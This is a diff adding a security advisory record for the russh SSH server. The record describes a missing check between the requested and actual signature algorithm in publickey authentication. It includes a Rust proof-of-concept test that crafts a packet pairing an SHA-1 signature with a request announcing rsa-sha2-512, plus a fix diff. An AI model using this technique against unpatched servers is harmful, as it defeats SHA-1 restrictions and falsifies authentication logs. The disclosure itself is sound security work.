@@ -1,0 +1,53 @@
+{
+  "id": "GHSA-j7h2-66j4-ghjf",
+  "modified": "2026-10-19T17:15:04.300380668Z",
+  "published": "2026-10-19T17:06:29Z",
+  "aliases": [
+    "CVE-2026-111062"
+  ],
+  "summary": "A russh SSH server accepts a publickey authentication whose signature uses a different algorithm than the one named in the request",
+  "details": "### Details\n\nIn `russh/src/server/encrypted.rs`, `server_read_auth_request_pk` (0.63.3, around lines 880-990):\n\n* The requested algorithm name (`pubkey_algo`) is read and only used to decode the key: `PublicKeyOrCertificate::decode(\u0026pubkey_algo, \u0026pubkey_key)`. The derived `hash_alg` is then dropped (`PublicKeyOrCertificate::PublicKey { ref key, .. }`).\n* The signature blob is decoded (`Signature::decode`) and verified with `Verifier::verify(\u0026pubkey, \u0026buf, \u0026sig)`. `ssh-key` picks the hash from **the signature's own algorithm** (`sig.algorithm()`).\n* `pubkey_algo` and `sig.algorithm()` are never compared.\n\nSo for an RSA key, the request can say `rsa-sha2-512` while the signature is `ssh-rsa`. The signature is valid for SHA-1, verification succeeds, and `Handler::auth_publickey` is called.\n\n**Affected versions: every russh release, from the first (`0.34.0-beta.1`, 2022-03) through 0.63.3 and current `main`.** The behaviour is inherited from `thrussh`, which russh was forked from.\n\nThe mechanism changed over time, but the outcome is the same: the hash is always taken from the signature blob, never checked against the request.\n\n* **Up to 0.46:** after reading the algorithm name inside the signature blob, russh overwrites the key's hash with it (`pubkey.set_algorithm(algo_)`), then verifies.\n* **From 0.47/0.48 (move to `ssh-key`):** the signature is decoded with its own algorithm (`sig_workaround::Sig::decode`, later `Signature::decode`) and verified with it.\n\nConfirmed by running the PoC below on 0.63.3. Confirmed by reading the code of `server/encrypted.rs` in 0.34.0-beta.1, 0.34.0, 0.36.0, 0.36.1, 0.37.1, 0.40.2, 0.43.0, 0.45.0, 0.46.0, 0.48.2, 0.50.4, 0.54.6, 0.58.1, 0.63.1, 0.63.3 and `main` (2026-09-30), and in thrussh 0.33.5.\n\n### PoC\n\nA unit test in the existing test module of `russh/src/server/encrypted.rs`. It uses the module's own helpers (`test_auth_session`, `sign_with_hash_alg`, `PrivateKeyWithHashAlg`) and needs no network or configuration.\n\n1. Check out russh 0.63.3, or `main`.\n2. Paste the code below inside `mod tests { ... }` of `russh/src/server/encrypted.rs`.\n3. Run `cargo test --lib poc_sha1`.\n\n```rust\n// ---- PoC: signature algorithm not checked against the requested one ----\n\n/// Records whether `auth_publickey` (called only after the signature\n/// verified) was reached.\n#[derive(Default)]\nstruct AcceptAnyKey {\n    authenticated: bool,\n}\n\nimpl Handler for AcceptAnyKey {\n    type Error = Error;\n\n    async fn auth_publickey_offered(\n        \u0026mut self,\n        _user: \u0026str,\n        _public_key: \u0026PublicKey,\n    ) -\u003e Result\u003cAuth, Self::Error\u003e {\n        Ok(Auth::Accept)\n    }\n\n    async fn auth_publickey(\n        \u0026mut self,\n        _user: \u0026str,\n        _public_key: \u0026PublicKey,\n    ) -\u003e Result\u003cAuth, Self::Error\u003e {\n        self.authenticated = true;\n        Ok(Auth::Accept)\n    }\n}\n\n/// A signed publickey request that names `announced` as its public key\n/// algorithm, but is signed with `hash` (`None` = `ssh-rsa`, SHA-1).\nfn signed_request_announcing(\n    user: \u0026str,\n    private_key: Arc\u003cPrivateKey\u003e,\n    announced: \u0026str,\n    hash: Option\u003ccrate::keys::HashAlg\u003e,\n) -\u003e Vec\u003cu8\u003e {\n    let mut packet = Vec::new();\n    packet.push(msg::USERAUTH_REQUEST);\n    user.encode(\u0026mut packet).unwrap();\n    \"ssh-connection\".encode(\u0026mut packet).unwrap();\n    \"publickey\".encode(\u0026mut packet).unwrap();\n    1u8.encode(\u0026mut packet).unwrap();\n    announced.encode(\u0026mut packet).unwrap();\n    private_key.public_key().to_bytes().unwrap().encode(\u0026mut packet).unwrap();\n\n    let mut signed = Vec::new();\n    CryptoVec::new().as_ref().encode(\u0026mut signed).unwrap();\n    signed.extend_from_slice(\u0026packet);\n    let signature =\n        sign_with_hash_alg(\u0026PrivateKeyWithHashAlg::new(private_key, hash), \u0026signed).unwrap();\n    signature.encode(\u0026mut packet).unwrap();\n    packet\n}\n\n#[tokio::test]\nasync fn poc_sha1_signature_accepted_when_rsa_sha2_512_is_announced() {\n    let rsa = ssh_key::private::RsaKeypair::random(\u0026mut rand::rng(), 2048).unwrap();\n    let private = Arc::new(PrivateKey::from(rsa));\n    let mut session = test_auth_session();\n    let mut handler = AcceptAnyKey::default();\n\n    // The request says rsa-sha2-512; the signature blob is ssh-rsa (SHA-1).\n    let packet = signed_request_announcing(\"alice\", private, \"rsa-sha2-512\", None);\n    session.process_packet(\u0026mut handler, \u0026packet).await.unwrap();\n\n    // RFC 8332 §3: the signature algorithm must be the requested one, so\n    // this request must be rejected. On russh 0.63.3 it is accepted.\n    assert!(\n        !handler.authenticated,\n        \"an ssh-rsa (SHA-1) signature was accepted for a request announcing rsa-sha2-512\"\n    );\n}\n```\n\nResult on unmodified 0.63.3:\n\n```\ntest server::encrypted::tests::poc_sha1_signature_accepted_when_rsa_sha2_512_is_announced ... FAILED\npanicked at src/server/encrypted.rs: an ssh-rsa (SHA-1) signature was accepted for a request announcing rsa-sha2-512\n```\n\nWith the fix below, the test passes and the whole library suite still passes: `cargo test --lib` gives 186 passed.\n\nSuggested fix: reject a mismatch through the existing `reject_auth_request(until, ...)` path, so the constant rejection time is kept.\n\n```diff\n--- a/russh/src/server/encrypted.rs\n+++ b/russh/src/server/encrypted.rs\n@@ -1023,6 +1023,21 @@\n                     map_err!(ensure_end(\u0026signature_reader))?;\n                     map_err!(ensure_end(r))?;\n \n+                    // RFC 8332 §3: the signature must use the algorithm the\n+                    // request names.\n+                    let offered_algorithm = match pk_or_cert {\n+                        PublicKeyOrCertificate::PublicKey { .. } =\u003e ssh_key::Algorithm::new(\u0026pubkey_algo),\n+                        PublicKeyOrCertificate::Certificate(_) =\u003e {\n+                            \u003cssh_key::Algorithm as crate::helpers::AlgorithmExt\u003e::new_certificate_ext(\u0026pubkey_algo)\n+                        }\n+                    };\n+                    if offered_algorithm.ok().as_ref() != Some(\u0026sig.algorithm()) {\n+                        debug!(\"signature algorithm does not match the requested one\");\n+                        auth_user.clear();\n+                        reject_auth_request(until, \u0026mut self.write, auth_request).await?;\n+                        return Ok(());\n+                    }\n+\n                     let is_valid = if accepted_probe_matches \u0026\u0026 user == auth_user {\n                         true\n                     } else {\n```\n\n### Impact\n\nThis is a missing check on the signature algorithm (improper verification of a cryptographic signature's algorithm, CWE-347) in the server's `publickey` authentication.\n\nWho is impacted: applications that use russh as an **SSH server** and rely on the requested algorithm to restrict, record or audit user-key signature algorithms. For example:\n\n* a server that refuses SHA-1 (`ssh-rsa`) signatures, as OpenSSH does by default since 8.8;\n* a server that logs which algorithm a client authenticated with.\n\nSuch a server can be made to accept a SHA-1 signature, or to record `rsa-sha2-512` for one, by any holder of a valid RSA key.\n\nNot impacted:\n\n* russh clients;\n* authentication strength beyond the choice of hash, since a valid signature by the private key is still required;\n* Te RSA keys were examined, the case where one key admits several signature algorithms (`ssh-rsa`, `rsa-sha2-256`, `rsa-sha2-512`). We did not test other key types.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "crates.io",
+        "name": "russh",
+        "purl": "pkg:cargo/russh"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0.34.0-beta.1"
+            },
+            {
+              "fixed": "0.64.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-j7h2-66j4-ghjf/GHSA-j7h2-66j4-ghjf.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/Eugeny/russh/security/advisories/GHSA-j7h2-66j4-ghjf"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/Eugeny/russh/commit/a0ded76bdc352f8fbeaaeb175fb2a0c586fbc8f2"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/Eugeny/russh"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/Eugeny/russh/releases/tag/v0.64.0"
+    }
+  ]
+}
